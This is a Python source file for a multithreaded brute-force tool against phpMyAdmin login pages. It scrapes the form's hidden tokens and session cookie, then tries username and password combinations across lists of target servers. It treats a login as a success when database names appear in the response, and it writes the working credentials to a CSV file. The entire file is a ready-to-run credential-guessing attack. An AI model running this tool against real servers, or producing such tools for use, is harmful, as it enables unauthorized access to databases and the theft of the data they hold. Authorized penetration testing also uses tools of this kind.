#! /usr/bin/env python3

import requests, warnings
from urllib.parse import quote
from bs4 import BeautifulSoup
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Lock, Pool, cpu_count
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

scheme = "http"
lock = Lock()
thread_count = cpu_count()
warnings.filterwarnings('ignore')

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def login(server, username, password, scheme="http", timeout=None):
    t1 = time()
    try:
        response = requests.get(f"{scheme}://{server}", timeout=timeout, verify=False)
        html = BeautifulSoup(response.content, "html.parser")
        hidden_input_tags = html.find_all("input", attrs={"type": "hidden"})
        data_dictionary = {tag.get_attribute_list("name")[0]: tag.get_attribute_list("value")[0] for tag in hidden_input_tags if tag.get_attribute_list("value")[0].strip() != ''}
        set_session = [cookie for cookie in response.headers["Set-Cookie"].split(';') if "phpMyAdmin" in cookie][-1].split('=')[-1]
        headers = {
            "Host": server,
            "Cache-Control": "max-age=0",
            "Cookie": f"pma_lang=en; phpMyAdmin={set_session}",
            "Origin": "null",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
            "Upgrade-Insecure-Requests": '1',
            "Accept-Language": "en-US,en;q=0.8",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        post_request_data = "&".join(f"{key}={quote(value, safe='', encoding=None, errors=None)}" for key, value in data_dictionary.items())
        post_request_data += f"&pma_username={quote(username)}&pma_password={quote(password)}"
        response = requests.post(f"{scheme}://{server}/index.php?route=/", headers=headers, data=post_request_data, timeout=timeout, verify=False)
        authorization_status = True if "information_schema" in response.text and "mysql" in response.text and "performance_schema" in response.text and "sys" in response.text else False
        t2 = time()
        return authorization_status, t2-t1
    except Exception as error:
        t2 = time()
        return error, t2-t1
def brute_force(thread_index, servers, credentials, scheme="http", timeout=None):
    successful_logins = {}
    for credential in credentials:
        status = ['']
        for server in servers:
            status = login(server, credential[0], credential[1], scheme, timeout)
            if status[0] == True:
                successful_logins[server] = [credential[0], credential[1]]
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status[0] == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
    return successful_logins
def main(servers, credentials, scheme="http", timeout=None):
    successful_logins = {}
    pool = Pool(thread_count)
    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
    threads = []
    total_servers = len(servers)
    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
    for index, server_division in enumerate(server_divisions):
        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
    for thread in threads:
        successful_logins.update(thread.get())
    pool.close()
    pool.join()
    display('+', f"Threads Finished Excuting")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-s', "--server", "server", "Target phpMyAdmin Servers (seperated by ',' or File Name)"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-S', "--scheme", "scheme", f"Scheme to use (Default={scheme})"),
                              ('-t', "--timeout", "timeout", "Timeout for Login Request"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.server:
        display('-', f"Please specify {Back.YELLOW}Target Servers{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.server, 'r') as file:
                arguments.server = [server for server in file.read().split('\n') if server != '']
        except FileNotFoundError:
            arguments.server = arguments.server.split(',')
        except Exception as error:
            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.credentials:
        if not arguments.users:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            arguments.users = ['']
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            arguments.password = ['']
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    arguments.scheme = arguments.scheme if arguments.scheme else scheme
    arguments.timeout = float(arguments.timeout) if arguments.timeout else None
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    T1 = time()
    successful_logins = main(arguments.server, arguments.credentials, arguments.scheme, arguments.timeout)
    T2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{T2-T1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(T2-T1):.2f} logins / seconds{Back.RESET}")
    if len(successful_logins) > 0:
        display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
        with open(arguments.write, 'w') as file:
            file.write(f"Server,User,Password\n")
            file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
        display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}") 